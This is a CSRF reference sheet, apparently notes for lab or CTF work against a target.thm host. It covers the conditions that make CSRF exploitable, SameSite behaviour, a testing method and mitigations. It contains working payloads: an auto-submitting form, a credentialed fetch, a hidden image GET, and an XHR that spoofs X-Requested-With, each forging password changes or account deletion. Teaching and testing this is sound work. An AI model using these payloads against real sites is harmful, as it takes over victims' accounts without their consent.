# CSRF (CROSS-SITE REQUEST FORGERY) REFERENCE

CSRF tricks a logged-in victim's browser into sending an authenticated, state-changing request to a target app without their knowledge. The attacker never sees the victim's session cookie or credentials — the browser does the work by auto-attaching them to the forged request. The vulnerability isn't in the attacker's page; it's the target app's failure to verify that the request was intentionally submitted by the user.

## Requirements For Exploitability

| Condition | Why it matters |
|---|---|
| Victim has an active, authenticated session (cookie-based) | The forged request needs something to ride on |
| Target action is state-changing (password change, email update, fund transfer, etc.) | GET-based reads are low-impact; CSRF targets writes |
| No unpredictable, validated anti-CSRF token | If a token is required and checked server-side, a forged request can't include a valid one |
| Cookie has no `SameSite=Strict`/`Lax` restriction (or browser doesn't enforce it) | `SameSite` blocks cross-site cookie attachment by default in modern browsers |
| No server-side origin/referer validation | Even without a token, checking `Origin`/`Referer` can block cross-site requests |

## Payload Patterns

### POST via auto-submitting form
```html
<form action="http://target.thm/change_password.php" method="POST" id="f">
  <input type="hidden" name="new_password" value="admin1">
</form>
<script>document.getElementById('f').submit();</script>
```
**What happens:** Victim's browser submits the form with their session cookie attached, no user interaction required beyond loading the page.

### POST via JavaScript XHR/fetch
```html
<script>
  fetch('http://target.thm/change_password.php', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'new_password=admin1'
  });
</script>
```
**What happens:** Same outcome as the form version, but gives more control over headers — useful if the target expects a specific `Content-Type` or custom header.

### GET-based CSRF (state-changing GET endpoints)
```html
<img src="http://target.thm/delete_account.php?confirm=yes" style="display:none">
```
**What happens:** If the vulnerable endpoint accepts GET for a state-changing action, just loading the image tag triggers it — no script execution needed at all, works even where script tags are filtered.

### Bypassing weak header-based CSRF checks
```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'http://target.thm/change_password.php', true);
  xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send('action=execute&new_password=admin1');
</script>
```
**What happens:** Some apps check only for the presence of `X-Requested-With: XMLHttpRequest` as a CSRF mitigation, assuming only same-origin JS can set it. In reality, attacker-controlled JS on any page can set this header too — the check provides no real protection.

## SameSite Bypass Considerations

| Cookie setting | CSRF impact |
|---|---|
| `SameSite=Strict` | Cookie withheld on virtually all cross-site requests — strongest protection |
| `SameSite=Lax` (browser default since 2020) | Cookie still sent on top-level GET navigations (e.g. clicking a link) — GET-based CSRF may still work |
| `SameSite=None` (requires `Secure`) | Cookie sent on all cross-site requests — no built-in CSRF protection from the cookie attribute at all |
| No `SameSite` set, older browser | Falls back to legacy behavior — effectively `None` |

## Testing Methodology
1. Identify state-changing endpoints (password reset, email change, fund transfer, account deletion, settings updates).
2. Check whether the request includes a CSRF token, and if so, whether it's actually validated server-side (remove/reuse/predict it and see if the request still succeeds).
3. Check the `Set-Cookie` header for `SameSite` and `Secure` attributes on the session cookie.
4. Build a PoC page hosting the forged request and test cross-origin from a different domain/port.
5. Confirm impact by checking if the action actually executed (e.g. password genuinely changed, account state altered).

## Mitigations (for writeups)
- Require a unique, unpredictable, per-session (or per-request) CSRF token validated server-side on every state-changing request.
- Set `SameSite=Strict` or `Lax` on session cookies, with `Secure` and `HttpOnly` also set.
- Validate `Origin`/`Referer` headers on sensitive endpoints as defense-in-depth.
- Require re-authentication (current password) for highly sensitive actions.
- Never treat custom headers like `X-Requested-With` as a standalone CSRF control — attacker JS can set them too.
- Avoid state-changing actions on GET requests entirely.

## Quick Notes
- CSRF and XSS are often confused but distinct: XSS injects code into the vulnerable app itself; CSRF forges a request *from* the attacker's page *to* the vulnerable app, relying only on the browser's automatic cookie handling.
- Modern browsers' `SameSite=Lax` default has reduced CSRF risk significantly, but plenty of legacy apps and misconfigured cookies remain exploitable.
- Always confirm impact, not just absence of a token — some apps validate tokens loosely (e.g. only checking presence, not correctness).
